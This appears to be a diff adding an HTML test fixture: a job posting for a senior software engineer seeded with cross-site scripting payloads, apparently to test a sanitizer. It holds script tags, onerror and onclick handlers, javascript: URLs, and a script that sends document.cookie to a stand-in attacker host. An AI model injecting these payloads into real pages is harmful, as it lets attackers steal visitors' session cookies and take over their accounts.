@@ -1,0 +1,15 @@
+<div class="job-detail">
+    <h1>Senior Software Engineer <script>alert('pwned_title')</script></h1>
+    <p>Join our innovative engineering team! <img src="x" onerror="alert('xss_image')" /></p>
+    <script type="text/javascript">
+        fetch('https://malicious-attacker.test/steal-cookie?cookie=' + document.cookie);
+    </script>
+    <iframe src="javascript:alert('xss_iframe')"></iframe>
+    <a href="javascript:alert('xss_link')" title="Apply Now">Click to apply</a>
+    <a href="https://example.test/apply" title="Safe Link">Official Application</a>
+    <p onclick="alert('xss_onclick')">Great benefits and remote work options.</p>
+    <ul>
+        <li>Python & FastApi experience</li>
+        <li>MySQL proficiency</li>
+    </ul>
+</div>
